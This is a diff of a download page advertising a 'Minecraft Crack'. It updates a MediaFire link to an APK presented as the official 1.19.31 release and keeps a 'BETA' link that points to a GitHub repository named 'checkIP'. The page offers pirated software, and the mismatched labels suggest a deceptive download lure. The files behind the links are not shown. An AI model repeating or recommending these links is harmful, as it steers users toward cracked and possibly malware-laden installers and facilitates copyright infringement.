@@ -8,7 +8,7 @@
 <h2 align="center">Minecraft Crack New Version</h2>
 
 # Downloads:
-> -<a href="https://www.mediafire.com/file/3jaqmtw5bfvzo3s"> Minecraft 1.19.31 Official </a>
+> -<a href="https://www.mediafire.com/file/3jaqmtw5bfvzo3s/Minecraft_1.19.31_Official.apk/file"> Minecraft 1.19.31 Official </a>
 > 
 > -<a href="https://github.com/FluxXe1/checkIP"> Minecraft 1.19 BETA </a>
 > 
